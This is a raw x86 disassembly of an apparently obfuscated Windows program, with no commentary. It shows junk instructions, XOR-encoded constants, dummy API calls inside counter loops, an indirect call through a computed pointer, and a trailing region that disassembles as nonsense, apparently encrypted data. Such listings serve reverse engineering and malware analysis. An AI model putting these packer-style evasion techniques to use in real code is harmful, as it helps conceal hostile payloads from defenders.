  40e8b6:	cmp    DWORD PTR ds:0x434547,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x434547
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x434547,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x434547
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x434547,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x43457b,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x43457b
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x43457b,edi
  40e900:	cmp    DWORD PTR ds:0x43457b,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x43457b,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x4346f3
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x43457b,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x43457b
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x43457b,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x43453f,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434587
  40e958:	adc    DWORD PTR ds:0x4345b7,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43451b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x434557
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x4345b3
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x4344ff,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x434547,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x4344fb
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x4344fb,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x4345f7
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x4345c7
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x4345ff,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434603,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x4344f7,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x434547,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x4345bf,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x434547,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x4345bb
  40ea3e:	sub    DWORD PTR ds:0x4345bf,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43458f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434503,0x4345c3
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43458b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434503,0x43454f
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x4345bf,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x43453f,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x4344ef,0x434503
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434503
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434593
  40eac7:	and    DWORD PTR ds:0x434543,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43460f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x43453f,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x43453f
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x43453f,ecx
  40eb04:	cmp    DWORD PTR ds:0x43453f,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x43453f,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x43453f,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x43453f
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x43453f,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x434547
  40eb55:	sbb    edx,DWORD PTR ds:0x434607
  40eb5b:	mov    DWORD PTR ds:0x434547,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43460b
  40eb6a:	or     DWORD PTR ds:0x4345bb,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x434537
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43460f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43460b,0x4345c7
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x43454f,0x434507
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x4345bf,0x4345fb
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x4344f7,0x434577
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x4344e3,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434583,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x43453b,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x434543,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434613,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x43457b,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434603,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x4344e7,0x43458f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434593,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434593
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434593,eax
  40ec60:	cmp    DWORD PTR ds:0x434593,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434593,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434593
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434593,eax
  40ec91:	cmp    DWORD PTR ds:0x434593,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x4344e3
  40eca5:	adc    eax,DWORD PTR ds:0x43457b
  40ecab:	mov    ds:0x4344e3,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x43453f,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x4345f7,0x434503
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x43457b
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x434537,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x4345fb
  40ecfd:	or     DWORD PTR ds:0x434613,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x434543,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x434577,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x4345d3,0x434537
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x4345f7,0x4344ff
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x434537,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434507,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x43453f,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434507,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x4345ff,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434607,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x4345c7,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x4345c7
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x4345c7,ecx
  40edb2:	cmp    DWORD PTR ds:0x4345c7,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x43485b
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x4345c7,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x43454f,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x4345c3,0x4345f7
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x4344ff,0x4344ef
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x43453b,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x4344ef
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x4344ff,0x13
  40ee32:	cmp    DWORD PTR ds:0x4344ff,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x4344ff,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x43485b
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x4344ff
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x4344ff,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0x3e
  40f16c:	(bad)  
  40f16d:	jg     0x40f1ab
  40f16f:	and    BYTE PTR [esi+0x79f47e7e],dh
  40f175:	jle    0x40f1f5
  40f177:	and    BYTE PTR [esi+eax*2],ah
  40f17a:	in     eax,dx
  40f17b:	inc    edi
  40f17c:	add    dl,BYTE PTR [ebx+0x6e58d2c3]
  40f182:	cmp    BYTE PTR [edi+0x7],cl
  40f185:	ja     0x40f1e3
  40f187:	cmp    ebx,ebp
  40f189:	dec    edx
  40f18a:	data16 out 0x86,al
  40f18d:	jle    0x40f1ba
  40f18f:	mov    eax,ds:0xc210c461
  40f194:	push   0xa0e559d4
  40f199:	fiadd  WORD PTR [edx+0x67]
  40f19c:	cmp    BYTE PTR [ecx],0x75
  40f19f:	sbb    DWORD PTR [edi-0x53ae6dc5],esp
  40f1a5:	adc    esi,DWORD PTR [edi*4-0x42f0a781]
  40f1ac:	push   cs
  40f1ad:	push   ebp
  40f1ae:	and    cl,BYTE PTR [ebp+0x1ababd94]
  40f1b4:	imul   edx,DWORD PTR [ecx],0x2dfcfde3
  40f1ba:	and    eax,0x9d8d4e68
  40f1bf:	rol    DWORD PTR [ebx-0x556ad057],cl
  40f1c5:	sbb    BYTE PTR [edx-0x5c],ah
  40f1c8:	mov    eax,ds:0xa4dcd2d
  40f1cd:	jbe    0x40f16a
  40f1cf:	dec    eax
  40f1d0:	mov    ebp,0x216d16d2
  40f1d5:	shl    cl,cl
  40f1d7:	(bad)  
  40f1d8:	call   DWORD PTR [ebx]
  40f1da:	pop    es
  40f1db:	jo     0x40f15d
  40f1dd:	stos   DWORD PTR es:[edi],eax
  40f1de:	test   al,0xa3
  40f1e0:	jg     0x40f18b
  40f1e2:	sub    eax,0x5ad4f8ee
  40f1e7:	mov    ds:0xffde359d,al
  40f1ec:	pop    esi
  40f1ed:	xchg   edx,eax
  40f1ee:	scas   al,BYTE PTR es:[edi]
  40f1ef:	pop    es
  40f1f0:	jmp    0xef89a25
  40f1f5:	xlat   BYTE PTR ds:[ebx]
  40f1f6:	and    eax,0x3c220c3b
  40f1fb:	fsubp  st(5),st
  40f1fd:	daa    
  40f1fe:	popa   
  40f1ff:	pop    ebp
  40f200:	cmp    al,0x45
  40f202:	mov    ah,0xd7
  40f204:	sahf   
  40f205:	test   DWORD PTR [edi+0x15],ebp
  40f208:	fwait
  40f209:	ss add eax,0x5d5fb04d
  40f20f:	pop    ecx
  40f210:	cmp    ebp,DWORD PTR [edi-0x13]
  40f213:	jle    0x40f23f
  40f215:	mov    esi,0x4abc90a7
  40f21a:	or     eax,esi
  40f21c:	xchg   ebx,eax
  40f21d:	in     eax,0x7c
  40f21f:	xchg   BYTE PTR [esi-0x5e2e2f57],dl
  40f225:	sub    BYTE PTR [ebx+0x58249ebd],bh
  40f22b:	inc    ecx
  40f22c:	ret    0x8dbf
  40f22f:	imul   edi,DWORD PTR [eax+0x6ef435b0],0x180f30a6
  40f239:	xchg   ebp,eax
  40f23a:	jge    0x40f234
  40f23c:	cmp    al,BYTE PTR [edx+0x5819b863]
  40f242:	jbe    0x40f289
  40f244:	jmp    0x40f292
  40f246:	ds sub al,0x83
  40f249:	inc    edx
  40f24a:	sbb    DWORD PTR [ebp+0x70a4a67d],0x23
  40f251:	les    esi,FWORD PTR [edx+ebp*4]
  40f254:	cmp    al,0xcf
  40f256:	sub    ah,BYTE PTR [edx+0x3dcaf545]
  40f25c:	cmp    ah,BYTE PTR [ebp+0x63]
  40f25f:	in     eax,0x44
  40f261:	dec    ecx
  40f262:	lods   eax,DWORD PTR ds:[esi]
  40f263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f264:	aam    0x8d
  40f266:	test   DWORD PTR [ecx-0x7ec5538e],0x3bbd5de4
  40f270:	int    0xaa
  40f272:	and    ebp,ebx
  40f274:	mov    ecx,0xf6b3eb48
  40f279:	test   eax,0x2a8e9ee8
  40f27e:	nop
  40f27f:	pop    esi
  40f280:	sub    bl,dh
  40f282:	sbb    eax,0x46325960
  40f287:	jbe    0x40f2aa
  40f289:	xor    ebx,DWORD PTR [ecx]
  40f28b:	mov    ds:0x53ca4944,eax
  40f290:	jne    0x40f288
  40f292:	popf   
  40f293:	retf   0x15f4
  40f296:	push   edx
  40f297:	stc    
  40f298:	mov    dl,0x94
  40f29a:	xchg   ebx,eax
  40f29b:	mov    eax,ds:0x213ce49
  40f2a0:	jne    0x40f2b1
  40f2a2:	mov    WORD PTR [edx+ebx*1-0x47],es
  40f2a6:	ins    DWORD PTR es:[edi],dx
